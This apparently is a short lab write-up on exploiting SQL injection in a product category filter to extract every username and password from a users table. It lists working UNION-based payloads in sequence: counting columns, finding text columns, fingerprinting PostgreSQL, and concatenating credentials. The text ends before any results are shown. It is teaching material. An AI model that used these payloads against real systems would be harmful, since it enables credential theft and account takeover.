SQL Injection: Product Category Filter

End goals:

- Retrieve all usernames and passwords from the users table
- Login as administrator usernames

ANALYSIS
---------

Test if the category filter is vulnerable by using SQLi character like '

1. First determine the number of columns that the vulnerable query is using

' order by 1--  # 200 response code => Column exist but not displayed on the page (Possibly database ID column)
' order by 2--  # 200 response code => Column exists & is displayed on the page
' order by 3--  # Internal Server Error => Column doesn't exist

This means the table has 2 columns only. We can only use column 2 since it's displaying on the page

2. Determine which columns contains data of type text/string

' UNION select 'a', NULL--  # Error => Column doesn't accept data type text/string
' UNION select NULL, 'a'--  # 200 response code => Column accepts data type text/string

3. Output data from another table (users table in this case)

Notice that we can only use one column to output data, however we need to output data from 2 columns (usernames & passwords)

- We can try to output each column one at a time

' UNION select NULL, username from users--
' UNION select NULL, password from users--

- We can also combine the output into one query using string concantenation. We will however need to determine the database type first.

' UNION select NULL, @@version-- # Error => Probably not using Microsoft database type
' UNION select NULL, version()-- # 200 response code => Application is using PostgreSQL database
"PostgreSQL 11.12 (Debian 11.12-1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit"

- We will now use string concatenation syntax for PostgreSQL

' UNION select NULL, username || password from users--
' UNION select NULL, username || ': ' || password from users-- # You can add a separator '-' to separate usernames from the passwords

We get the below:
